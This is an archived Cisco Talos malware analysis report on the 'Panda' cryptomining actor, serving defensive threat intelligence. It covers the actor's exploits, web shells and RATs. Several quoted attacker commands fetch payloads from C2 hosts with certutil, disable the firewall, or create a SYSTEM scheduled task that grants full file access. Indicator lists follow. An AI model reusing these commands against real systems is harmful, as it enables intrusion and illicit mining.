{
    "id": "dfdac915-d27f-4e55-b972-7854b0f2b97b",
    "created_at": "2023-01-12T15:09:56.306433Z",
    "updated_at": "2025-03-27T02:15:46.061865Z",
    "deleted_at": null,
    "sha1_hash": "2b0192ac4cb427af12b93951b5c099b085e6d022",
    "title": "2019-09-17 - Cryptocurrency miners aren’t dead yet- Documenting the voracious but simple “Panda”",
    "authors": "",
    "file_creation_date": "2022-05-28T00:30:41Z",
    "file_modification_date": "2022-05-28T00:30:41Z",
    "file_size": 582784,
    "plain_text": "# Cryptocurrency miners aren’t dead yet: Documenting the voracious but simple “Panda”\n\n**blog.talosintelligence.com/2019/09/panda-evolution.html**\n\n_By_ _[Christopher Evans and](https://twitter.com/ccevans002)_ _[David Liebenberg.](https://twitter.com/ChinaHandDave)_\n\n## Executive summary\n\nA new threat actor named \"Panda\" has generated thousands of dollars worth of the Monero cryptocurrency through the use\nof remote access tools (RATs) and illicit cryptocurrency-mining malware. This is far from the most sophisticated actor we've\never seen, but it still has been one of the most active attackers we've seen in Cisco Talos threat trap data. Panda's\nwillingness to persistently exploit vulnerable web applications worldwide, their tools allowing them to traverse throughout\nnetworks, and their use of RATs, means that organizations worldwide are at risk of having their system resources misused\nfor mining purposes or worse, such as exfiltration of valuable information.\n\nPanda has shown time and again they will update their infrastructure and exploits on the fly as security researchers\npublicize indicators of compromises and proof of concepts. Our threat traps show that Panda uses exploits previously used\nby Shadow Brokers — a group infamous for publishing information from the National Security Agency — and Mimikatz, an\nopen-source credential-dumping program.\n\nTalos first became aware of Panda in the summer of 2018, when they were engaging in the successful and widespread\n\"MassMiner\" campaign. Shortly thereafter, we linked Panda to another widespread illicit mining campaign with a different\nset of command and control (C2) servers. Since then, this actor has updated its infrastructure, exploits and payloads. We\nbelieve Panda is a legitimate threat capable of spreading cryptocurrency miners that can use up valuable computing\nresources and slow down networks and systems. Talos confirmed that organizations in the banking, healthcare,\ntransportation, telecommunications, IT services industries were affected in these campaigns.\n\n\n-----\n\n## First sightings of the not-so-elusive Panda\n\n[We first observed this actor in July of 2018 exploiting a WebLogic vulnerability (CVE-2017-10271) to drop a miner that was](https://nvd.nist.gov/vuln/detail/CVE-2017-10271)\n[associated with a campaign called \"MassMiner\" through the wallet, infrastructure, and post-exploit PowerShell commands](https://www.alienvault.com/blogs/labs-research/massminer-malware-targeting-web-servers)\nused.\n\nPanda used massscan to look for a variety of different vulnerable servers and then exploited several different\nvulnerabilities, including the aforementioned Oracle bug and a remote code execution vulnerability in Apache Struts 2\n[(CVE-2017-5638). They used PowerShell post-exploit to download a miner payload called \"downloader.exe,\" saving it in](https://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html)\nthe TEMP folder under a simple number filename such as \"13.exe\" and executing it. The sample attempts to download a\nconfig file from list[.]idc3389[.]top over port 57890, as well as kingminer[.]club. The config file specifies the Monero wallet to\nbe used as well as the mining pool. In all, we estimate that Panda has amassed an amount of Monero that is currently\nvalued at roughly $100,000.\n\n\n-----\n\nBy October 2018, the config file on list[.]idc3389[.]top, which was then an instance of an HttpFileServer (HFS), had been\ndownloaded more than 300,000 times.\n\nThe sample also installs Gh0st RAT, which communicates with the domain rat[.]kingminer[.]club. In several samples, we\nalso observed Panda dropping other hacking tools and exploits. This includes the credential-theft tool Mimikatz and UPXpacked artifacts related to the Equation Group set of exploits. The samples also appear to scan for open SMB ports by\nreaching out over port 445 to IP addresses in the 172.105.X.X block.\n\nOne of Panda's C2 domains, idc3389[.]top, was registered to a Chinese-speaking actor, who went by the name \"Panda.\"\n\n## Bulehero connection\n\nAround the same time that we first observed these initial Panda attacks, we observed very similar TTPs in an attack using\nanother C2 domain: bulehero[.]in. The actors used PowerShell to download a file called \"download.exe\" from\nb[.]bulehero[.]in, and similarly, save it as another simple number filename such as \"13.exe\" and execute it. The file server\nturned out to be an instance of HFS hosting four malicious files.\n\n\n-----\n\nRunning the sample in our sandboxes, we observed several elements that connect it to the earlier MassMiner campaign.\nFirst, it issues a GET request for a file called cfg.ini hosted on a different subdomain of bulehero[.]in, c[.]bulehero[.]in, over\nthe previously observed port 57890. Consistent with MassMiner, the config file specifies the site from which the original\nsample came, as well as the wallet and mining pool to be used for mining.\n\nAdditionally, the sample attempts to shut down the victim's firewall with commands such as \"cmd /c net stop MpsSvc\". The\nmalware also modifies the access control list to grant full access to certain files through running cacsl.exe.\n\nFor example:\n\ncmd /c schtasks /create /sc minute /mo 1 /tn \"Netframework\" /ru system /tr \"cmd /c echo Y|cacls\nC:\\Windows\\appveif.exe /p everyone:F\n\nBoth of these behaviors have also been observed in previous MassMiner infections.\n\nThe malware also issues a GET request to Chinese-language IP geolocation service ip138[.]com for a resource named\nic.asp which provides the machine's IP address and location in Chinese. This behavior was also observed in the\nMassMiner campaign.\n\nAdditionally, appveif.exe creates a number of files in the system directory. Many of these files were determined to be\nmalicious by multiple AV engines and appear to match the exploits of vulnerabilities targeted in the MassMiner campaign.\nFor instance, several artifacts were detected as being related to the \"Shadow Brokers\" exploits and were installed in a\nsuspiciously named directory: \"\\Windows\\InfusedAppe\\Eternalblue139\\specials\\\".\n\n## Evolution of Panda\n\nIn January of 2019, Talos analysts observed Panda exploiting a recently disclosed vulnerability in the ThinkPHP web\nframework (CNVD-2018-24942) in order to spread similar malware. ThinkPHP is an open-source web framework popular in\nChina.\n\nPanda used this vulnerability to both directly download a file called \"download.exe\" from a46[.]bulehero[.]in and upload a\nsimple PHP web shell to the path \"/public/hydra.php\", which is subsequently used to invoke PowerShell to download the\nsame executable file. The web shell provides only the ability to invoke arbitrary system commands through URL\nparameters in an HTTP request to \"/public/hydra.php\". Download.exe would download the illicit miner payload and also\nengages in SMB scanning, evidence of Panda's attempt to move laterally within compromised organizations.\n\nIn March 2019, we observed the actor leveraging new infrastructure, including various subdomains of the domain\nhognoob[.]se. At the time, the domain hosting the initial payload, fid[.]hognoob[.]se, resolved to the IP address\n195[.]128[.]126[.]241, which was also associated with several subdomains of bulehero[.]in.\n\n\n-----\n\nAt the time, the actor s tactics, techniques, and procedures (TTPs) remained similar to those used before. Post exploit,\nPanda invokes PowerShell to download an executable called \"download.exe\" from the URL\nhxxp://fid[.]hognoob[.]se/download.exe and save it in the Temp folder, although Panda now saved it under a high-entropy\nfilename i.e. 'C:/Windows/temp/autzipmfvidixxr7407.exe'. This file then downloads a Monero mining trojan named\n\"wercplshost.exe\" from fid[.]hognoob[.]se as well as a configuration file called \"cfg.ini\" from uio[.]hognoob[.]se, which\nprovides configuration details for the miner.\n\n\"Wercplshost.exe\" contains exploit modules designed for lateral movement, many of which are related to the \"Shadow\nBrokers\" exploits, and engages in SMB brute-forcing. The sample acquires the victim's internal IP and reaches out to\nChinese-language IP geolocation site 2019[.]ip138[.]com to get the external IP, using the victim's Class B address as a\nbasis for port scanning. It also uses the open-source tool Mimikatz to collect victim passwords.\n\nSoon thereafter, Panda began leveraging an updated payload. Some of the new features of the payload include using\nCertutil to download the secondary miner payload through the command: \"certutil.exe -urlcache -split -f\nhttp://fid[.]hognoob[.]se/upnpprhost.exe C:\\Windows\\Temp\\upnpprhost.exe\". The coinminer is also run using the command\n\"cmd /c ping 127.0.0.1 -n 5 & Start C:\\Windows\\ugrpkute\\[filename].exe\".\n\nThe updated payload still includes exploit modules designed for lateral movement, many of which are related to the\n\"Shadow Brokers\" exploits. One departure, however, is previously observed samples acquire the victim's internal IP and\nreach out to Chinese-language IP geolocation site 2019[.]ip138[.]com to get the external IP, using the victim's Class B\naddress as a basis for port scanning. This sample installs WinPcap and open-source tool Masscan and scans for open\nports on public IP addresses saving the results to \"Scant.txt\" (note the typo). The sample also writes a list of hardcoded IP\nranges to \"ip.txt\" and passes it to Masscan to scan for port 445 and saves the results to \"results.txt.\" This is potentially\nintended to find machines vulnerable to MS17-010, given the actor's history of using EternalBlue. The payload also\nleverages previously-used tools, launching Mimikatz to collect victim passwords\n\nIn June, Panda began targeting a newer WebLogic vulnerability, [CVE-2019-2725, but their TTPs remained the same.](https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html)\n\n## Recent activity\n\nPanda began employing new C2 and payload-hosting infrastructure over the past month. We observed several attacker IPs\npost-exploit pulling down payloads from the URL hxxp[:]//wiu[.]fxxxxxxk[.]me/download.exe and saving it under a random\n20-character name, with the first 15 characters consisting of \"a\" - \"z\" characters and the last five consisting of digits (e.g.,\n\"xblzcdsafdmqslz19595.exe\"). Panda then executes the file via PowerShell. Wiu[.]fxxxxxxk[.]me resolves to the IP\n3[.]123[.]17[.]223, which is associated with older Panda C2s including a46[.]bulehero[.]in and fid[.]hognoob[.]se.\n\nBesides the new infrastructure, the payload is relatively similar to the one they began using in May 2019, including using\nCertutil to download the secondary miner payload located at hxxp[:]//wiu[.]fxxxxxxk[.]me/sppuihost.exe and using ping to\ndelay execution of this payload. The sample also includes Panda's usual lateral movement modules that include Shadow\nBrokers' exploits and Mimikatz.\n\nOne difference is that several samples contained a Gh0st RAT default mutex \"DOWNLOAD_SHELL_MUTEX_NAME\" with\nthe mutex name listed as fxxk[.]noilwut0vv[.]club:9898. The sample also made a DNS request for this domain. The domain\nresolved to the IP 46[ ]173[ ]217[ ]80 which is also associated with several subdomains of fxxxxxxk[ ]me and older Panda\n\n\n-----\n\nC2 hognoob[.]se. Combining mining capabilities and Gh0st RAT represents a return to Panda s earlier behavior.\n\nOn August 19, 2019, we observed that Panda has added another set of domains to his inventory of C2 and payloadhosting infrastructure. In line with his previous campaigns, we observed multiple attacker IPs pulling down payloads from\nthe URL hxxp[:]//cb[.]f*ckingmy[.]life/download.exe. In a slight departure from previous behavior, the file was saved as\n\"BBBBB,\", instead of as a random 20-character name. cb[.]f*ckingmy[.]life (URL censored due to inappropriate language)\ncurrently resolves to the IP 217[.]69[.]6[.]42, and was first observed by Cisco Umbrella on August 18.\n\nIn line with previous samples Talos has analyzed over the summer, the initial payload uses Certutil to download the\nsecondary miner payload located at http[:]//cb[.]fuckingmy[.]life:80/trapceapet.exe. This sample also includes a Gh0st RAT\nmutex, set to \"oo[.]mygoodluck[.]best:51888:WervPoxySvc\", and made a DNS request for this domain. The domain\nresolved to 46[.]173[.]217[.]80, which hosts a number of subdomains of fxxxxxxk[.]me and hognoob[.]se, both of which are\nknown domains used by Panda. The sample also contacted li[.]bulehero2019[.]club.\n\nCisco Threat Grid's analysis also showed artifacts associated with Panda's typical lateral movement tools that include\nShadow Brokers exploits and Mimikatz. The INI file used for miner configuration lists the mining pool as mi[.]oops[.]best,\nwith a backup pool at mx[.]oops[.]best.\n\n## Conclusion\n\nPanda's operational security remains poor, with many of their old and current domains all hosted on the same IP and their\nTTPs remaining relatively similar throughout campaigns. The payloads themselves are also not very sophisticated.\n\nHowever, system administrators and researchers should never underestimate the damage an actor can do with widely\navailable tools such as Mimikatz. Some information from HFS used by Panda shows that this malware had a wide reach\nand rough calculations on the amount of Monero generated show they made around 1,215 XMR in profits through their\nmalicious activities, which today equals around $100,000, though the amount of realized profits is dependent on the time\nthey sold.\n\n\n-----\n\nPanda remains one of the most consistent actors engaging in illicit mining attacks and frequently shifts the infrastructure\nused in their attacks. They also frequently update their targeting, using a variety of exploits to target multiple vulnerabilities,\nand is quick to start exploiting known vulnerabilities shortly after public POCs become available, becoming a menace to\nanyone slow to patch. And, if a cryptocurrency miner is able to infect your system, that means another actor could use the\nsame infection vector to deliver other malware. Panda remains an active threat and Talos will continue to monitor their\nactivity in order to thwart their operations.\n\n## COVERAGE\n\nFor coverage related to blocking illicit cryptocurrency mining, please see the Cisco Talos white paper: Blocking\nCryptocurrency Mining Using Cisco Security Products\n\n[Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.](https://www.cisco.com/c/en/us/products/security/advanced-malware-protection)\n\n[Cisco Cloud Web Security (CWS) or Web Security Appliance (WSA) web scanning prevents access to malicious websites](https://www.cisco.com/c/en/us/products/security/cloud-web-security/index.html)\nand detects malware used in these attacks.\n\n[Network Security appliances such as Next-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System](https://www.cisco.com/c/en/us/products/security/firewalls/index.html)\n[(NGIPS), and Meraki MX can detect malicious activity associated with this threat.](https://meraki.cisco.com/products/appliances)\n\n[AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.](https://www.cisco.com/c/en/us/solutions/enterprise-networks/amp-threat-grid/index.html)\n\n[Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether](https://umbrella.cisco.com/)\nusers are on or off the corporate network.\n\nOpen Source SNORTⓇ Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available\n[for purchase on Snort.org.](https://www.snort.org/products)\n\n## IOCs\n\n### Domains\n\na45[.]bulehero[.]in\n\na46[.]bulehero[.]in\n\na47[.]bulehero[.]in\n\na48[.]bulehero[.]in\n\na88[.]bulehero[.]in\n\na88[.]heroherohero[.]info\n\na[.]bulehero[.]in\n\naic[.]fxxxxxxk[.]me\n\naxx[.]bulehero[.]in\n\nb[.]bulehero[.]in\n\nbulehero[.]in\n\nc[.]bulehero[.]in\n\ncb[.]fuckingmy[.].life\n\n\n-----\n\ncnm[.]idc3389[.]top\ndown[.]idc3389[.]top\nfid[.]hognoob[.]se\nfxxk[.]noilwut0vv[.]club\nhaq[.]hognoob[.]se\nidc3389[.]top\nidc3389[.]cc\nidc3389[.]pw\nli[.]bulehero2019[.]club\nlist[.]idc3389[.]top\nmi[.]oops[.]best\nmx[.]oops[.]best\nnrs[.]hognoob[.]se\noo[.]mygoodluck[.]best\npool[.]bulehero[.]in\npxi[.]hognoob[.]se\npxx[.]hognoob[.]se\nq1a[.]hognoob[.]se\nqie[.]fxxxxxxk[.]me\nrp[.]oiwcvbnc2e[.]stream\nuio[.]heroherohero[.]info\nuio[.]hognoob[.]se\nupa1[.]hognoob[.]se\nupa2[.]hognoob[.]se\nwiu[.]fxxxxxxk[.]me\nyxw[.]hognoob[.]se\nzik[.]fxxxxxxk[.]me\n\n### IPs\n\n184[.]168[.]221[.]47\n\n172[.]104[.]87[.]6\n\n139[.]162[.]123[.]87\n\n139[.]162[.]110[.]201\n\n116[.]193[.]154[.]122\n\n95[.]128[.]126[.]241\n\n195[.]128[.]127[.]254\n\n195[.]128[.]126[.]120\n\n195[.]128[.]126[.]243\n\n195[.]128[.]124[.]140\n\n139[.]162[.]71[.]92\n\n3[.]123[.]17[.]223\n\n46[.]173[.]217[.]80\n\n5[.]56[.]133[.]246\n\n### SHA-256\n\n2df8cfa5ea4d63615c526613671bbd02cfa9ddf180a79b4e542a2714ab02a3c1\n\nfa4889533cb03fc4ade5b9891d4468bac9010c04456ec6dd8c4aba44c8af9220\n\n2f4d46d02757bcf4f65de700487b667f8846c38ddb50fbc5b2ac47cfa9e29beb\n\n829729471dfd7e6028af430b568cc6e812f09bb47c93f382a123ccf3698c8c08\n\n8b645c854a3bd3c3a222acc776301b380e60b5d0d6428db94d53fad6a98fc4ec\n\n1e4f93a22ccbf35e2f7c4981a6e8eff7c905bc7dbb5fedadd9ed80768e00ab27\n\n0697127fb6fa77e80b44c53d2a551862709951969f594df311f10dcf2619c9d5\n\nf9a972757cd0d8a837eb30f6a28bc9b5e2a6674825b18359648c50bbb7d6d74a\n\n34186e115f36584175058dac3d34fe0442d435d6e5f8c5e76f0a3df15c9cd5fb\n\n\n-----\n\n29b6dc1a00fea36bc3705344abea47ac633bc6dbff0c638b120d72bc6b38a36f\n3ed90f9fbc9751a31bf5ab817928d6077ba82113a03232682d864fb6d7c69976\na415518642ce4ad11ff645151195ca6e7b364da95a8f89326d68c836f4e2cae1\n4d1f49fac538692902cc627ab7d9af07680af68dd6ed87ab16710d858cc4269c\n8dea116dd237294c8c1f96c3d44007c3cd45a5787a2ef59e839c740bf5459f21\n991a9a8da992731759a19e470c36654930f0e3d36337e98885e56bd252be927e\na3f1c90ce5c76498621250122186a0312e4f36e3bfcfede882c83d06dd286da1\n9c37a6b2f4cfbf654c0a5b4a4e78b5bbb3ba26ffbfab393f0d43dad9000cb2d3\nd5c1848ba6fdc6f260439498e91613a5db8acbef10d203a18f6b9740d2cab3ca\n29b6dc1a00fea36bc3705344abea47ac633bc6dbff0c638b120d72bc6b38a36f\n6d5479adcfa4c31ad565ab40d2ea8651bed6bd68073c77636d1fe86d55d90c8d\n\n### Monero Wallets\n\n49Rocc2niuCTyVMakjq7zU7njgZq3deBwba3pTcGFjLnB2Gvxt8z6PsfEn4sc8WPPedTkGjQVHk2RLk7btk6Js8gKv9iLCi\n1198.851653275126\n\n4AN9zC5PGgQWtg1mTNZDySHSS79nG1qd4FWA1rVjEGZV84R8BqoLN9wU1UCnmvu1rj89bjY4Fat1XgEiKks6FoeiRi1EHhh\n44qLwCLcifP4KZfkqwNJj4fTbQ8rkLCxJc3TW4UBwciZ95yWFuQD6mD4QeDusREBXMhHX9DzT5LBaWdVbsjStfjR9PXaV9L\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-09-17 - Cryptocurrency miners aren’t dead yet- Documenting the voracious but simple “Panda”.pdf"
    ],
    "report_names": [
        "2019-09-17 - Cryptocurrency miners aren’t dead yet- Documenting the voracious but simple “Panda”.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d4f7cf97-9c98-409c-8b95-b80d14c576a5",
            "created_at": "2022-10-25T16:07:24.561104Z",
            "updated_at": "2025-03-27T02:02:10.281202Z",
            "deleted_at": null,
            "main_name": "Shadow Brokers",
            "aliases": [],
            "source_name": "ETDA:Shadow Brokers",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "08623296-52be-4977-8622-50efda44e9cc",
            "created_at": "2023-01-06T13:46:38.549387Z",
            "updated_at": "2025-03-27T02:00:02.859535Z",
            "deleted_at": null,
            "main_name": "Equation Group",
            "aliases": [
                "Tilded Team",
                "EQGRP",
                "G0020"
            ],
            "source_name": "MISPGALAXY:Equation Group",
            "tools": [
                "EquationLaser",
                "EquationDrug",
                "DoubleFantasy",
                "TripleFantasy",
                "GrayFish"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "171b85f2-8f6f-46c0-92e0-c591f61ea167",
            "created_at": "2023-01-06T13:46:38.830188Z",
            "updated_at": "2025-03-27T02:00:02.929729Z",
            "deleted_at": null,
            "main_name": "The Shadow Brokers",
            "aliases": [
                "Shadow Brokers",
                "ShadowBrokers",
                "The ShadowBrokers",
                "TSB"
            ],
            "source_name": "MISPGALAXY:The Shadow Brokers",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2d9fbbd7-e4c3-40e5-b751-27af27c8610b",
            "created_at": "2024-05-01T02:03:08.144214Z",
            "updated_at": "2025-03-27T02:05:17.419705Z",
            "deleted_at": null,
            "main_name": "PLATINUM COLONY",
            "aliases": [
                "Equation Group "
            ],
            "source_name": "Secureworks:PLATINUM COLONY",
            "tools": [
                " EquationDrug",
                " EquationLaser",
                " Fanny",
                " GrayFish",
                " TripleFantasy",
                "DoubleFantasy"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e0fed6e6-a593-4041-80ef-694261825937",
            "created_at": "2022-10-25T16:07:23.593572Z",
            "updated_at": "2025-03-27T02:02:09.879892Z",
            "deleted_at": null,
            "main_name": "Equation Group",
            "aliases": [
                "APT-C-40",
                "Platinum Colony",
                "Tilded Team"
            ],
            "source_name": "ETDA:Equation Group",
            "tools": [
                "Bvp47",
                "DEMENTIAWHEEL",
                "DOUBLEFANTASY",
                "DanderSpritz",
                "DarkPulsar",
                "DoubleFantasy",
                "DoubleFeature",
                "DoublePulsar",
                "Duqu",
                "EQUATIONDRUG",
                "EQUATIONLASER",
                "EQUESTRE",
                "Flamer",
                "GRAYFISH",
                "GROK",
                "OddJob",
                "Plexor",
                "Prax",
                "Regin",
                "Skywiper",
                "TRIPLEFANTASY",
                "Tilded",
                "UNITEDRAKE",
                "WarriorPride",
                "sKyWIper"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536196,
    "ts_updated_at": 1743041746,
    "ts_creation_date": 1653697841,
    "ts_modification_date": 1653697841,
    "files": {
        "pdf": "https://archive.orkl.eu/2b0192ac4cb427af12b93951b5c099b085e6d022.pdf",
        "text": "https://archive.orkl.eu/2b0192ac4cb427af12b93951b5c099b085e6d022.txt",
        "img": "https://archive.orkl.eu/2b0192ac4cb427af12b93951b5c099b085e6d022.jpg"
    }
}